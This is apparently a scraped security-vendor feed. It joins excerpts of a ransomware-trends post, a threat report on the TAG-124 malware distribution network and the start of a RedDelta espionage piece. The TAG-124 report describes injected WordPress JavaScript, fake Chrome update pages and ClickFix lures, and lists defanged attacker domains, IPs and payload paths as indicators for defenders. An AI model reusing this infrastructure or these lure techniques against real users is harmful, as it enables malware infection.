High-profile incidents show that this global threat is rapidly accelerating.</p>\n        <p>To stay ahead, organizations need to understand how ransomware is changing. Here are four key trends shaping the threat landscape as well as tips for using cyber threat intelligence to help counter them.</p>\n        <h2>1. AI-assisted scams: The era of targeted attacks</h2>\n        <p>Generative artificial intelligence (AI) is supercharging phishing campaigns. Attackers now use AI to impersonate IT helpdesk staff with startling realism. Unsuspecting employees can fall victim to social engineering tactics, including the use of convincing references to real workplace events and colleagues as well as the use of local languages, dialects, and accents.</p>\n        <p>AI’s voice synthesis and data harvesting capabilities make these attacks highly plausible. When employees believe they’re speaking with legitimate IT support staff, they’re likely to lower their guard and share access details, leaving their organizations’ secure networks exposed to ransomware deployment.</p>\n        <p>Defensive tip: Regular, realistic training simulations informed by cyber threat intelligence can help staff recognize and resist AI-enhanced social engineering.</p>\n        <h2>2. The wiper threat: Weaponizing state-sponsored tactics</h2>\n        <p>Wiper malware, more commonly associated with state-sponsored sabotage, is now being weaponized by financially motivated ransomware groups. Attackers use these destructive payloads to erase backups and corrupt systems, leaving victims with no real path to recovery.</p>\n        <p>When victims balk at paying ransoms, attackers threaten to deploy wipers to render data unrecoverable. This tactic dramatically increases pressure on victims and undermines their negotiating power.</p>\n        <p>Defensive tip: Implement immutable offline backups and regularly test restoration procedures under simulated attack conditions. Make sure to tag and monitor sensitive data and tightly control access.</p>\n        <h3>3. Supply chain vulnerabilities: Exploitation of vendor relationships</h3>\n        <p>Rather than attempting to directly hit their prime targets, ransomware groups are increasingly targeting software vendors and supply chain partners. By exploiting zero-day vulnerabilities in trusted applications, attackers gain stealthy access to downstream organizations and a route into their target victims’ networks.</p>\n        <p>The MOVEit Transfer campaign by the CLOP group is a prime example, mirroring earlier incidents like SolarWinds. These attacks bypass traditional defenses and scale rapidly, often going undetected until after ransomware has been deployed.</p>\n        <p>Defensive tip: Strengthen supply chain risk management through informed, up-to-date cyber threat intelligence. Build knowledge to track third-party dependencies, validate update integrity, and require vendors to demonstrate secure development practices.</p>\n        <h2>4. Decentralized threats: The risk of independent ransomware operators</h2>\n        <p>While Ransomware-as-a-Service (RaaS) remains prevalent, a growing number of attackers are operating independently or in small groups. These lone wolves repurpose leaked ransomware builders from groups like LockBit, Chaos, and Conti, avoiding the visibility that comes with large-scale operations.</p>\n        <p>This decentralization makes it harder for defenders to anticipate attacks based on known group behaviors. Even after law enforcement disrupts a RaaS group, its tools can live on through lone wolves.</p>\n        <p>Defensive tip: Continue to monitor for code, tools, and techniques from defunct or low-risk RaaS groups.

All references to 404TDS as an alias belonging to TAG-124 have been removed.</em></p>\n        <h2>Executive Summary</h2>\n        <p>Insikt Group has identified multi-layered infrastructure linked to a traffic distribution system (TDS) tracked by Recorded Future as TAG-124, which overlaps with threat activity clusters known as LandUpdate808, KongTuke, and Chaya_002. TAG-124 comprises a network of compromised WordPress sites, actor-controlled payload servers, a central server, a suspected management server, an additional panel, and other components. The threat actors behind TAG-124 demonstrate high levels of activity, including regularly updating URLs embedded in the compromised WordPress sites, adding servers, refining TDS logic to evade detection, and adapting infection tactics, as demonstrated by their recent implementation of the ClickFix technique.</p>\n        <p>Insikt Group identified multiple threat actors using TAG-124 within their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others. Notably, the shared use of TAG-124 reinforces the <a href=\"https://blog.talosintelligence.com/emerging-interlock-ransomware/\">connection</a> between Rhysida and Interlock ransomware, which are already linked through similarities in tactics, tools, encryption behaviors, ransom note themes, code overlaps, and data exfiltration techniques. Insikt Group expects that TAG-124 will continue its operations within the increasingly sophisticated and specialized cybercriminal ecosystem, enhance its effectiveness, and attract additional users and partners.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Insikt Group identified multi-layered infrastructure linked to a TDS tracked as TAG-124. This infrastructure includes a network of compromised WordPress sites, likely actor-controlled payload servers, a central server, a suspected management server, and an additional panel, among other components.</li>\n          <li>The threat actor(s) associated with TAG-124 appear highly active, regularly updating URLs on compromised WordPress sites to evade detection, adding new servers to their infrastructure, and improving TDS-linked conditional logic and infection tactics.</li>\n          <li>Multiple threat actors are assessed to incorporate TAG-124’s service into their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others.</li>\n          <li>While Rhysida and Interlock ransomware have been associated with each other due to similarities in tactics, tools, encryption behaviors, ransom note themes, overlaps in code, and data exfiltration techniques, the shared use of TAG-124 reinforces this connection.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>TAG-124, which overlaps with LandUpdate808, KongTuke, and Chaya_002, is a TDS used to distribute malware on behalf of various threat actors, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, and TA582, among others (<a href=\"https://malasada.tech/the-landupdate808-fake-update-variant/\">1</a>, <a href=\"https://x.com/GroupIB_TI/status/1790230870684828047\">2</a>, <a href=\"https://www.forescout.com/blog/sly-malware-found-in-fake-google-chrome-and-ms-teams-installers/\">3</a>). A TDS typically <a href=\"https://www.ncsc.gov.uk/files/White-paper-Ransomware-extortion-and-the-cyber-crime-ecosystem.pdf\">refers</a> to a system used to analyze and redirect web traffic based on parameters like geolocation or device type, funneling only specific visitors to malicious destinations such as phishing sites, malware, or exploit kits, while evading detection and optimizing cybercriminal campaigns.</p>\n        <p>More specifically, TAG-124 operates by injecting malicious JavaScript code into compromised WordPress websites. When visitors access an infected website, they unknowingly load attacker-controlled resources designed to manipulate them into completing actions that result in the download and execution of malware. TAG-124 often deceives victims by presenting the malware as a required Google Chrome browser update.</p>\n        <p>In more recent variations, TAG-124 has been <a href=\"https://malasada.tech/updated-landupdate808-analysis/\">observed</a> using the ClickFix technique. This approach displays a dialog instructing visitors to execute a command pre-copied to their clipboard. Once a visitor runs the command, it initiates a multi-stage process that downloads and executes the malware payload.</p>\n        <h2>Threat Analysis</h2>\n        <h3>TAG-124</h3>\n        <p>Insikt Group identified multi-layered infrastructure associated with the TDS TAG-124. This infrastructure comprises a network of compromised WordPress sites, likely actor-controlled payload servers, a central server whose exact purpose remains unclear at the time of analysis, a suspected management server, and an additional management panel. If visitors fulfill specific criteria, the compromised WordPress websites display fake Google Chrome update landing pages, which ultimately lead to malware infections as discussed in the <a href=\"https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.gfx3d1cfkcni\">Users of TAG-124</a> section of this report (see <strong>Figure 1</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"TAG-124’s high-level infrastructure setup\" src=\"https://www.recordedfuture.com/media_1a29a34307c115995bfe10442554b6af8207f0f89.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"980\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1</em></strong><em>: TAG-124’s high-level infrastructure setup (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h4>Compromised WordPress Websites</h4>\n        <p>TAG-124’s infrastructure consists of an extensive network of WordPress websites (see <strong>Appendix A</strong>). These websites appear to lack a consistent theme regarding industry, topic, or geography, suggesting they were likely compromised opportunistically through exploits or by acquiring credentials, such as those obtained via infostealers.</p>\n        <h5>First-Stage WordPress Websites in Initial Delivery</h5>\n        <p>The compromised websites of the first stage in the initial delivery phase typically include a script tag with an async attribute at an arbitrary location in the document object model (DOM), enabling the loading of an external JavaScript file in parallel with the page to avoid rendering delays (see <strong>Figure 2</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Script tag in DOM used to load external JavaScript file\" src=\"https://www.recordedfuture.com/media_14d76df3a13a589e6b0580eb03c41480ad4bf376c.png?width=750&amp;format=png&amp;optimize=medium\" width=\"731\" height=\"43\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 2</em></strong><em>: Script tag in DOM used to load external JavaScript file (Source:</em> <em><a href=\"https://urlscan.io/result/eaa33803-1435-44c9-949f-3d707f51da4a\">URLScan</a>)</em></div>\n          </div>\n        </div>\n        <p>The JavaScript filename has changed frequently over time, with earlier names following recognizable patterns (such as metrics.js) and more recent ones <a href=\"https://threatfox.abuse.ch/ioc/1353344/\">appearing</a> to be randomly formatted (such as hpms1989.js). Example filenames include:</p>\n        <ul>\n          <li>3561.js</li>\n          <li>365h.js</li>\n          <li>e365r.js</li>\n          <li>hpms1989.js</li>\n          <li>metrics.js</li>\n          <li>nazvanie.js</li>\n          <li>web-analyzer.js</li>\n          <li>web-metrics.js</li>\n          <li>web.js</li>\n          <li>wp-config.js</li>\n          <li>wp.js</li>\n        </ul>\n        <p>Notably, the threat actors appear to be regularly updating the URLs on the compromised websites. For instance, the website associated with <em>www[.]ecowas[.]int</em> has consistently changed the URL used to fetch the JavaScript file. This behavior indicates that the threat actors maintain ongoing access to these WordPress sites and frequently alter the URLs, including the domain and JavaScript filename, likely to evade detection.</p>\n        <p>Although many of the compromised WordPress websites appear to be associated with lesser-known organizations, Insikt Group identified notable cases, including a subdomain linked to the Polish Centre for Testing and Certification, <em>www[.]pcbc[.]gov[.]pl</em>, and the domain of the Economic Community of West African States (ECOWAS) (<em>www[.]ecowas[.]int</em>). Both have been compromised and used in TAG-124 campaigns.</p>\n        <h5>Final Stage WordPress Websites in Initial Delivery</h5>\n        <p>If visitors meet specific criteria, which could not be fully determined, the compromised WordPress domains typically present fake Google Chrome update landing pages. These pages prompt users to click a download button, triggering the download of the actual payload from designated endpoints on a secondary set of compromised WordPress websites, including but likely not limited to:</p>\n        <ul>\n          <li>/wp-admin/images/wfgth.php</li>\n          <li>/wp-includes/pomo/update.php</li>\n          <li>/wp-content/upgrade/update.php</li>\n          <li>/wp-admin/images/rsggj.php</li>\n        </ul>\n        <h5>Fake Google Chrome Update Landing Pages</h5>\n        <p>Insikt Group discovered two variants of fake Google Chrome update landing pages associated with TAG-124 (see <strong>Figure 3</strong>). According to URLScan submission data, Variant 1 has been active longer, with its earliest submission recorded on April 24, 2024.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Fake Google Chrome update variant 1 (left) and 2 (right)\" src=\"https://www.recordedfuture.com/media_198b4fda88be52fcde06009d8880f6522a3a20a8a.png?width=750&amp;format=png&amp;optimize=medium\" width=\"688\" height=\"209\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 3</em></strong><em>: Fake Google Chrome update variant 1 (left) and 2 (right) (Source:</em> <em><a href=\"https://urlscan.io/result/fe2ed819-76f1-4a9e-a313-5a8ebcf5f05a/dom\">URLScan</a>,</em> <em><a href=\"https://urlscan.io/result/1f65a245-131e-4cbf-b0d7-b6055b361eaa\">URLScan</a>)</em></div>\n          </div>\n        </div>\n        <p>Only victims meeting a specific set of still unknown conditions are directed to the fake Google Chrome update landing page, resulting in the observation of only a limited number of domains (see <strong>Table 1</strong>).

threat actor-controlled TAG-124 delivery servers (Source: Recorded Future)</em></p>\n        <p>Most of the domains began resolving in November 2024, suggesting that TAG-124 gained momentum during this period, with the majority of the domains still active at the time of analysis. Of note, two domains hosted on <em>45[.]61[.]136[.]67</em>, namely <em>piedsmontlaw[.]com</em> and <em>pemalite[.]com</em>, were already resolving to this IP address in 2022, indicating that the server may have already been under the control of the threat actor during that time.</p>\n        <h5>Suspected Higher-Tier Infrastructure</h5>\n        <p>The majority of the suspected threat actor-controlled TAG-124 delivery servers, as listed in the <a href=\"https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.78m3kdx91knq\">TAG-124 Delivery Servers</a> section, have been seen communicating with a server over TCP port 443 (see <strong>Figure 1</strong>). The configurations of this server are similar to those of the delivery servers and host a domain that returns only a generic HTML page when accessed. At the time of analysis, Insikt Group could not determine the exact purpose of this server but suspects it plays a central role in the operation. One possibility is that it contains the core logic of the TDS.</p>\n        <p>Additionally, Insikt Group identified a suspected management server linked to TAG-124. This server has been observed communicating with the delivery servers via TCP ports 80 and 443. It has also interacted with another panel linked to TAG-124, referred to as the \"Ads Panel\", whose purpose includes serving the latest delivery server through a specified endpoint, among others (see <strong>Figure 1</strong>).</p>\n        <p>\n          <img loading=\"lazy\" alt=\"cover\"

","content:encodedSnippet":"Analysis cut-off date: January 7, 2025\nNOTE: This report was updated on May 12, 2025, after it was discovered that TAG-124 is unrelated to 404TDS. All references to 404TDS as an alias belonging to TAG-124 have been removed.\nExecutive Summary\nInsikt Group has identified multi-layered infrastructure linked to a traffic distribution system (TDS) tracked by Recorded Future as TAG-124, which overlaps with threat activity clusters known as LandUpdate808, KongTuke, and Chaya_002. TAG-124 comprises a network of compromised WordPress sites, actor-controlled payload servers, a central server, a suspected management server, an additional panel, and other components. The threat actors behind TAG-124 demonstrate high levels of activity, including regularly updating URLs embedded in the compromised WordPress sites, adding servers, refining TDS logic to evade detection, and adapting infection tactics, as demonstrated by their recent implementation of the ClickFix technique.\nInsikt Group identified multiple threat actors using TAG-124 within their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others. Notably, the shared use of TAG-124 reinforces the connection between Rhysida and Interlock ransomware, which are already linked through similarities in tactics, tools, encryption behaviors, ransom note themes, code overlaps, and data exfiltration techniques. Insikt Group expects that TAG-124 will continue its operations within the increasingly sophisticated and specialized cybercriminal ecosystem, enhance its effectiveness, and attract additional users and partners.\nKey Findings\nInsikt Group identified multi-layered infrastructure linked to a TDS tracked as TAG-124. This infrastructure includes a network of compromised WordPress sites, likely actor-controlled payload servers, a central server, a suspected management server, and an additional panel, among other components.\nThe threat actor(s) associated with TAG-124 appear highly active, regularly updating URLs on compromised WordPress sites to evade detection, adding new servers to their infrastructure, and improving TDS-linked conditional logic and infection tactics.\nMultiple threat actors are assessed to incorporate TAG-124’s service into their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others.\nWhile Rhysida and Interlock ransomware have been associated with each other due to similarities in tactics, tools, encryption behaviors, ransom note themes, overlaps in code, and data exfiltration techniques, the shared use of TAG-124 reinforces this connection.\nBackground\nTAG-124, which overlaps with LandUpdate808, KongTuke, and Chaya_002, is a TDS used to distribute malware on behalf of various threat actors, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, and TA582, among others (1, 2, 3). A TDS typically refers to a system used to analyze and redirect web traffic based on parameters like geolocation or device type, funneling only specific visitors to malicious destinations such as phishing sites, malware, or exploit kits, while evading detection and optimizing cybercriminal campaigns.\nMore specifically, TAG-124 operates by injecting malicious JavaScript code into compromised WordPress websites. When visitors access an infected website, they unknowingly load attacker-controlled resources designed to manipulate them into completing actions that result in the download and execution of malware. TAG-124 often deceives victims by presenting the malware as a required Google Chrome browser update.\nIn more recent variations, TAG-124 has been observed using the ClickFix technique. This approach displays a dialog instructing visitors to execute a command pre-copied to their clipboard. Once a visitor runs the command, it initiates a multi-stage process that downloads and executes the malware payload.\nThreat Analysis\nTAG-124\nInsikt Group identified multi-layered infrastructure associated with the TDS TAG-124. This infrastructure comprises a network of compromised WordPress sites, likely actor-controlled payload servers, a central server whose exact purpose remains unclear at the time of analysis, a suspected management server, and an additional management panel. If visitors fulfill specific criteria, the compromised WordPress websites display fake Google Chrome update landing pages, which ultimately lead to malware infections as discussed in the Users of TAG-124 section of this report (see Figure 1).\nFigure 1: TAG-124’s high-level infrastructure setup (Source: Recorded Future)\nCompromised WordPress Websites\nTAG-124’s infrastructure consists of an extensive network of WordPress websites (see Appendix A). These websites appear to lack a consistent theme regarding industry, topic, or geography, suggesting they were likely compromised opportunistically through exploits or by acquiring credentials, such as those obtained via infostealers.\nFirst-Stage WordPress Websites in Initial Delivery\nThe compromised websites of the first stage in the initial delivery phase typically include a script tag with an async attribute at an arbitrary location in the document object model (DOM), enabling the loading of an external JavaScript file in parallel with the page to avoid rendering delays (see Figure 2).\nFigure 2: Script tag in DOM used to load external JavaScript file (Source: URLScan)\nThe JavaScript filename has changed frequently over time, with earlier names following recognizable patterns (such as metrics.js) and more recent ones appearing to be randomly formatted (such as hpms1989.js). Example filenames include:\n3561.js\n365h.js\ne365r.js\nhpms1989.js\nmetrics.js\nnazvanie.js\nweb-analyzer.js\nweb-metrics.js\nweb.js\nwp-config.js\nwp.js\nNotably, the threat actors appear to be regularly updating the URLs on the compromised websites. For instance, the website associated with www[.]ecowas[.]int has consistently changed the URL used to fetch the JavaScript file. This behavior indicates that the threat actors maintain ongoing access to these WordPress sites and frequently alter the URLs, including the domain and JavaScript filename, likely to evade detection.\nAlthough many of the compromised WordPress websites appear to be associated with lesser-known organizations, Insikt Group identified notable cases, including a subdomain linked to the Polish Centre for Testing and Certification, www[.]pcbc[.]gov[.]pl, and the domain of the Economic Community of West African States (ECOWAS) (www[.]ecowas[.]int). Both have been compromised and used in TAG-124 campaigns.\nFinal Stage WordPress Websites in Initial Delivery\nIf visitors meet specific criteria, which could not be fully determined, the compromised WordPress domains typically present fake Google Chrome update landing pages. These pages prompt users to click a download button, triggering the download of the actual payload from designated endpoints on a secondary set of compromised WordPress websites, including but likely not limited to:\n/wp-admin/images/wfgth.php\n/wp-includes/pomo/update.php\n/wp-content/upgrade/update.php\n/wp-admin/images/rsggj.php\nFake Google Chrome Update Landing Pages\nInsikt Group discovered two variants of fake Google Chrome update landing pages associated with TAG-124 (see Figure 3). According to URLScan submission data, Variant 1 has been active longer, with its earliest submission recorded on April 24, 2024.\nFigure 3: Fake Google Chrome update variant 1 (left) and 2 (right) (Source: URLScan, URLScan)\nOnly victims meeting a specific set of still unknown conditions are directed to the fake Google Chrome update landing page, resulting in the observation of only a limited number of domains (see Table 1). These domains can be attributed to TAG-124 based on the URLs embedded in the DOM, public reporting, or other indicators. Notably, the threat actors consistently misspell the word “referer” as “refferer” in the query parameter, a typographical error observed in earlier reports.\nDomain\nNotes\nVariant\nwww[.]reloadinternet[.]com\nLinked to www[.]netzwerkreklame[.]de\n1\n          \nselectmotors[.]net\nLinked to www[.]netzwerkreklame[.]de\n1\n          \nmgssoft[.]com\nLinked to www[.]netzwerkreklame[.]de\n1\n          \nwww[.]lovebscott[.]com\nLinked to sustaincharlotte[.]org\n1\n          \nevolverangesolutions[.]com\nLinked to sustaincharlotte[.]org\n1\n          \nwww[.]ecowas[.]int\nLinked to www[.]pawrestling[.]net\n1\n          \nns1[.]webasatir[.]ir\nLinkedto true-blood[.]net, which has been previously associated with TAG-124\n2\n          \navayehazar[.]ir\nLinked to true-blood[.]net\n2\n          \ncvqrcode[.]lpmglobalrelations[.]com\nLinked to true-blood[.]net\n2\n          \nmktgads[.]com\nLinked to true-blood[.]net\n2\n          \nincalzireivar[.]ro\nLinked to true-blood[.]net\n2\n          \ngmdva[.]org\nLinked to true-blood[.]net\n2\n          \nwww[.]de[.]digitaalkantoor[.]online\nLinked to true-blood[.]net\n2\n          \nelamoto[.]com\nLinkedto TAG-124 and has the typographical error in the query parameter; it was redirected from winworld[.]es, a domain associated with Spain-based WinWorld, a company specializing in computer support and services\n2\n          \nTable 1: Likely compromised websites hosting fake Google Chrome update pages (Source: Recorded Future)\nLikely Threat Actor-Owned Domain\nWhile the domains listed in Table 1 are likely compromised, Insikt Group analyzed URLs present on websites hosted on two additional domains (see Table 2). Our analysis suggests these domains are highly likely connected to TAG-124.\nDomain\nNotes\nVariant\nupdate-chronne[.]com\nContainedlink to true-blood[.]net\n1\n          \nsollishealth[.]com\nContainedlinks to edveha[.]com and espumadesign[.]com; both were previously associated with TAG-124\n2\n          \nTable 2: Additional domains found via visual similarity search (Source: Recorded Future)\nThe domain update-chronne[.]com, hosted behind Cloudflare, appears to be owned by the threat actors as it directly impersonates Google Chrome (see Figure 4). At the time of analysis, the domain was still active, indexed by Google Search, and hosted the file Release.zip, which was identified as REMCOS RAT.\n Figure 4: Google Chrome fake update landing page on update-chronne[.]com (Source: Recorded Future)\n        \nNotably, when a victim clicks the “Update Chrome” button, the website redirects to downloading[.]bplnetempresas[.]com, which shows the IP address 146.70.41[.]191 combined with three different ports (see Figure 5). This IP address has previously been associated with REMCOS RAT.\nFigure 5: Suspected REMCOS RAT command-and-control (C2) server shown on downloading[.]bplnetempresas[.]com (Source: Recorded Future)\nAdditionally, the domain hosted a file named moc.txt, containing a PowerShell script designed to download and execute the contents of Release.zip (see Figure 6). The URL was redirected via the shortened URL https://wl[.]gl/25dW64.\n Figure 6: PowerShell script hosted on https://update-chronne[.]com/moc.txt as of September 12, 2024 (Source: URLScan)\n        \nSuspected Shell Website\nBoth update-chronne[.]com and downloading[.]bplnetempresas[.]com hosted a website seemingly associated with \"YSOFEL\", which appears to be a Brazilian organization (see Figure 7). However, no information about this organization could be found online, indicating that it is likely a fictitious entity.\nFigure 7: Suspected shell website linked to a fake Brazilian organization (Source: URLScan)\nInsikt Group identified several other domains, some of which are noted in the Compromised WordPress Websites section (such as mktgads[.]com), while others appear to impersonate Google (such as check-googlle[.]com) (see Table 3). This suggests that the website may function as a \"shell website\", potentially used to age domains or to display content only when visitors meet specific criteria.\nDomain\nIP Address\nFirst Seen\nLast Seen\nNotes\nchallinksch[.]com\nCloudflare\n2024-09-05\n2025-01-05\nHosted PowerShell script to download PuTTY and linked to AsyncRAT\nchalnlizt[.]org\nCloudflare\n2024-08-21\n2025-01-07\nHosted PowerShell script\ncheck-googlle[.]com\nCloudflare\n2024-09-09\n2025-01-07\nN/A\ncihainlst[.]org\nCloudflare\n2024-08-21\n2025-01-07\nN/A\nio-suite-web[.]com\nCloudflare\n2024-08-14\n2025-01-07\nN/A\nminer-tolken[.]com\nCloudflare\n2024-09-06\n2025-01-07\nN/A\nronnin-v2[.]com\nCloudflare\n2024-05-27\n2025-01-07\nN/A\nsymdilatic[.]com\nCloudflare\n2024-08-20\n2025-01-07\nN/A\nsymbieitc[.]com\nCloudflare\n2024-08-21\n2025-01-04\nN/A\nsymdlotic[.]com\nCloudflare\n2024-08-21\n2025-01-07\nN/A\nsynbioltic[.]com\nCloudflare\n2024-08-21\n2025-01-07\nN/A\nsymbliatc[.]com\nCloudflare\n2024-08-20\n2024-12-30\nN/A\nsymbietic[.]com\nCloudflare\n2024-08-19\n2025-01-07\nN/A\ncomteste[.]com\nCloudflare\n2024-08-19\n2025-01-07\nN/A\nsymdilotic[.]com\nCloudflare\n2024-08-20\n2024-12-30\nN/A\nv2-rubby[.]com\nCloudflare\n2024-05-22\n2025-01-07\nN/A\nTable 3: Domains linked to the same suspected “shell website” linked to the fake Brazilian organization referenced above (Source: Recorded Future)\nIt remains uncertain whether all the domains in Table 3 are malicious or connected to the same activity. However, their shared hosting of the same website, impersonation of other brands (such as ChainList), and partial verification of links to infections make them, at the very least, suspicious.\nTAG-124 Delivery Servers\nTAG-124 leverages compromised WordPress websites for various components of its infection chains. The servers embedded in the DOMs of these compromised first-stage WordPress sites, as detailed in the First-Stage WordPress Websites in Initial Delivery section, are likely owned by the threat actors. Insikt Group identified a significant network of servers connected to and likely controlled by the TAG-124 threat actors (see Table 4).\nDomain\nIP Address\nFirst Seen\nLast Seen\nambiwa[.]com\n45[.]61[.]136[.]9\n2024-12-28\n2025-01-07\ngcafin[.]com\n45[.]61[.]136[.]9\n2024-12-29\n2025-01-06\ndiscoves[.]com\n45[.]61[.]136[.]9\n2024-12-26\n2025-01-06\nxaides[.]com\n45[.]61[.]136[.]40\n2025-01-02\n2025-01-07\nusbkits[.]com\n45[.]61[.]136[.]40\n2025-01-02\n2025-01-07\nmirugby[.]com\n45[.]61[.]136[.]40\n2025-01-02\n2025-01-07\necrut[.]com\n45[.]61[.]136[.]41\n2025-01-06\n2025-01-07\npursyst[.]com\n45[.]61[.]136[.]41\n2025-01-06\n2025-01-07\npushcg[.]com\n45[.]61[.]136[.]67\n2024-09-18\n2025-01-07\npiedsmontlaw[.]com\n45[.]61[.]136[.]67\n2022-12-22\n2025-01-06\npemalite[.]com\n45[.]61[.]136[.]67\n2022-12-22\n2025-01-07\nhowmanychairs[.]com\n45[.]61[.]136[.]67\n2024-03-14\n2025-01-06\ncalbbs[.]com\n45[.]61[.]136[.]89\n2024-12-18\n2025-01-07\nhabfan[.]com\n45[.]61[.]136[.]132\n2024-12-07\n2025-01-07\niognews[.]com\n45[.]61[.]136[.]132\n2024-12-06\n2025-01-07\nsafigdata[.]com\n45[.]61[.]136[.]196\n2024-11-19\n2025-01-07\nnyciot[.]com\n45[.]61[.]136[.]196\n2024-11-20\n2025-01-07\npweobmxdlboi[.]com\n64[.]7[.]198[.]66\n2024-08-27\n2025-01-07\nboneyn[.]com\n64[.]94[.]85[.]98\n2024-12-22\n2025-01-07\nsatpr[.]com\n64[.]94[.]85[.]98\n2024-12-22\n2025-01-07\ncoeshor[.]com\n64[.]94[.]85[.]248\n2024-12-06\n2025-01-07\nmtclibraries[.]com\n64[.]94[.]85[.]248\n2024-12-11\n2025-01-07\nsdrce[.]com\n64[.]95[.]11[.]65\n2024-12-13\n2025-01-07\ntheinb[.]com\n64[.]95[.]11[.]65\n2024-12-13\n2025-01-07\nelizgallery[.]com\n64[.]95[.]11[.]184\n2024-11-20\n2025-01-07\nenethost[.]com\n64[.]95[.]12[.]38\n2024-12-26\n2025-01-07\ndhusch[.]com\n64[.]95[.]12[.]38\n2024-12-24\n2025-01-07\nfastard[.]com\n64[.]95[.]12[.]38\n2024-12-25\n2025-01-07\nfranklinida[.]com\n64[.]95[.]12[.]98\n2024-10-18\n2025-01-07\nnastictac[.]com\n64[.]190[.]113[.]41\n2024-11-25\n2025-01-07\ndncoding[.]com\n64[.]190[.]113[.]41\n2024-11-26\n2025-01-07\ndjnito[.]com\n64[.]190[.]113[.]111\n2024-12-11\n2025-01-07\nopgears[.]com\n64[.]190[.]113[.]111\n2024-12-11\n2025-01-07\ntickerwell[.]com\n162[.]33[.]177[.]36\n2024-11-19\n2025-01-07\nselmanc[.]com\n162[.]33[.]177[.]82\n2024-12-16\n2025-01-07\ntibetin[.]com\n162[.]33[.]177[.]82\n2024-12-16\n2025-01-07\nmercro[.]com\n162[.]33[.]178[.]59\n2024-10-31\n2025-01-07\nesaleerugs[.]com\n162[.]33[.]178[.]63\n2024-11-22\n2025-01-07\ntayakay[.]com\n162[.]33[.]178[.]75\n2024-11-15\n2024-11-15\nilsotto[.]com\n162[.]33[.]178[.]113\n2024-11-23\n2025-01-07\nchewels[.]com\n193[.]149[.]176[.]179\n2024-12-05\n2025-01-07\nsokrpro[.]com\n193[.]149[.]176[.]223\n2024-12-20\n2025-01-07\nhdtele[.]com\n193[.]149[.]176[.]223\n2024-12-20\n2025-01-07\nchhimi[.]com\n193[.]149[.]176[.]248\n2024-08-15\n2025-01-07\ndechromo[.]com\n216[.]245[.]184[.]179\n2024-12-09\n2025-01-07\nenerjjoy[.]com\n216[.]245[.]184[.]179\n2024-12-09\n2025-01-07\ndsassoc[.]com\n216[.]245[.]184[.]179\n2024-12-18\n2025-01-07\ngwcomics[.]com\n216[.]245[.]184[.]210\n2024-12-19\n2025-01-07\ngenhil[.]com\n216[.]245[.]184[.]225\n2024-11-18\n2025-01-07\nvicrin[.]com\n216[.]245[.]184[.]225\n2024-11-05\n2025-01-07\neliztalks[.]com\n216[.]245[.]184[.]225\n2024-11-16\n2025-01-07\nrshank[.]com\n216[.]245[.]184[.]225\n2024-11-13\n2025-01-06\nTable 4: Likely threat actor-controlled TAG-124 delivery servers (Source: Recorded Future)\nMost of the domains began resolving in November 2024, suggesting that TAG-124 gained momentum during this period, with the majority of the domains still active at the time of analysis. Of note, two domains hosted on 45[.]61[.]136[.]67, namely piedsmontlaw[.]com and pemalite[.]com, were already resolving to this IP address in 2022, indicating that the server may have already been under the control of the threat actor during that time.\nSuspected Higher-Tier Infrastructure\nThe majority of the suspected threat actor-controlled TAG-124 delivery servers, as listed in the TAG-124 Delivery Servers section, have been seen communicating with a server over TCP port 443 (see Figure 1). The configurations of this server are similar to those of the delivery servers and host a domain that returns only a generic HTML page when accessed. At the time of analysis, Insikt Group could not determine the exact purpose of this server but suspects it plays a central role in the operation. One possibility is that it contains the core logic of the TDS.\nAdditionally, Insikt Group identified a suspected management server linked to TAG-124. This server has been observed communicating with the delivery servers via TCP ports 80 and 443. It has also interacted with another panel linked to TAG-124, referred to as the \"Ads Panel\", whose purpose includes serving the latest delivery server through a specified endpoint, among others (see Figure 1).\nTAG-124’s Multi-Layered TDS Infrastructure and Extensive User Base\nRead the Complete Analysis\nDownload report\nAppendix A — Indicators of Compromise\nLikely Compromised WordPress Domains

The group used lure documents themed around the 2024 Taiwanese presidential candidate Terry Gou, the Vietnamese National Holiday, flood protection in Mongolia, and meeting invitations, including an Association of Southeast Asian Nations (ASEAN) meeting. RedDelta likely compromised the Mongolian Ministry of Defense in August 2024 and the Communist Party of Vietnam in November 2024. The group conducted spearphishing targeting the Vietnamese Ministry of Public Security, but Insikt Group observed no evidence of successful compromise. From September to December 2024, RedDelta likely targeted victims in Malaysia, Japan, the United States, Ethiopia, Brazil, Australia, and India.</p>\n        <p>In late 2023, RedDelta evolved the first stage of its infection chain to leverage a Windows Shortcut (LNK) file likely delivered via spearphishing. In 2024, the group transitioned to using Microsoft Management Console Snap-In Control (MSC) files. Most recently, RedDelta used spearphishing links to prompt a victim to load an HTML file remotely hosted on Microsoft Azure. Since July 2023, RedDelta has consistently used the Cloudflare content distribution network (CDN) to proxy command-and-control (C2) traffic, which enables the group to blend in with legitimate CDN traffic and complicates victim identification. Other state-sponsored groups, including Russia’s BlueAlpha, have similarly leveraged Cloudflare to evade detection.</p>\n        <p>RedDelta’s activities align with Chinese strategic 